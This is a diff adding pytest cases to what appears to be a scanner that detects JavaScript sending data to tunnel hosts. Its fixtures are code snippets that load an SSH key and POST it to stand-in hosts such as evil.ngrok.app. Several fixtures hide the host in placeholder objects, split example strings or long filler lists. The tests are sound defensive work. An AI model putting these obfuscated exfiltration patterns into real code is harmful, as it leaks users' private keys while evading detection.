@@ -181,3 +181,65 @@ def test_reachable_suffix_set_is_restored(change):
 def test_other_file_naming_the_set_restores():
     reg = (FIX / "agent_native_custom_registry.js.txt").read_text()
     assert "critical" in _tree_sevs(reg, "fetch('https://' + [...FORBIDDEN_HOST_SUFFIXES][0]);\n")
+
+
+# --- review of #379: a tunnel host listed as data must never reach a network call ----
+
+_KEY = "const sshKey = loadKey();\n"
+_POST = ", {method: 'POST', body: sshKey});\n"
+
+
+@pytest.mark.parametrize("code", [
+    # a placeholder the code then dials
+    _KEY + "const o = {\n  placeholder: 'evil.ngrok.app',\n};\n"
+    "fetch(`https://${o.placeholder}/c`" + _POST,
+    # the placeholder's object read whole
+    _KEY + "const o = {\n  placeholder: 'evil.ngrok.app',\n};\n"
+    "const h = Object.values(o)[0];\nfetch('https://' + h" + _POST,
+    # an example string split and used as the host, directly or via a helper
+    _KEY + "const hint = 'enter a bare hostname, e.g. evil.ngrok.app';\n"
+    "const host = hint.split('e.g. ')[1];\nfetch('https://' + host" + _POST,
+    _KEY + "const hint = 'e.g. evil.ngrok.app';\ngo(hint);\n"
+    "function go(x) { return fetch('https://' + x.slice(5)" + _POST.rstrip(";\n") + "; }\n",
+    # a long filler list, read back
+    _KEY + _psl(_FILLER[:120] + ["evil.ngrok.io"] + _FILLER[120:])
+    .replace("module.exports = [", "const L = [")
+    + "fetch('https://' + L.find((h) => h.startsWith('evil'))" + _POST,
+    # fake suffix-list markers do not help a list that is handed to a sender
+    _KEY + _psl(_FILLER[:120] + ["*.ck", "!www.ck", "evil.ngrok.io"] + _FILLER[120:])
+    .replace("module.exports = [", "const L = [") + "send(L);\n",
+    # a suffix allowlist used as a destination
+    _KEY + "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n  ],\n};\n"
+    "fetch('https://x' + cfg.allowedHosts[0]" + _POST,
+    _KEY + "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n  ],\n};\n"
+    "const suffixes = cfg.allowedHosts;\npost(suffixes);\n",
+])
+def test_tunnel_data_that_reaches_a_network_call_stays_critical(code):
+    assert "critical" in _sevs(code, "dist/x.js"), code
+
+
+def test_long_list_without_suffix_list_markers_stays_critical():
+    # 240 filler hosts alone are not the Public Suffix List
+    assert "critical" in _sevs(_psl(_FILLER[:120] + ["ngrok.io"] + _FILLER[120:]),
+                               "dist/bundle.js")
+
+
+@pytest.mark.parametrize("marker", [["*.ck", "!www.ck"], ["*.bd"], ["!city.kobe.jp"]])
+def test_suffix_list_with_markers_and_no_reader_is_low(marker):
+    code = _psl(_FILLER[:100] + marker + _FILLER[100:120] + ["ngrok.io"] + _FILLER[120:])
+    assert _sevs(code, "dist/bundle.js") == ["low"]
+
+
+def test_value_reaches_network_unit():
+    from src.scanner.scan import _psl_markers, _value_reaches_network
+
+    lines = ["const o = {", "  placeholder: 'x.ngrok.app',", "};",
+             "if (answer === o) done();", "if (o.placeholder.startsWith(k)) ok();"]
+    assert not _value_reaches_network(lines, {"placeholder"}, (1, 1))
+    assert _value_reaches_network(lines + ["return placeholder;"], {"placeholder"}, (1, 1))
+    assert _value_reaches_network(lines + ["const u = o.placeholder;", "log(u);"],
+                                  {"placeholder"}, (1, 1))
+    assert _value_reaches_network(lines, set(), (1, 1))  # no holder: unsure
+    assert _value_reaches_network(["x: 'a', fetch(u)"], {"x"}, (0, 0))  # sink on the line
+    assert _psl_markers(['"*.ck",'], 0, 0) and _psl_markers(["// ===BEGIN ICANN DOMAINS==="], 0, 0)
+    assert not _psl_markers(['"host1.example.app",', '"ngrok.io",'], 0, 1)
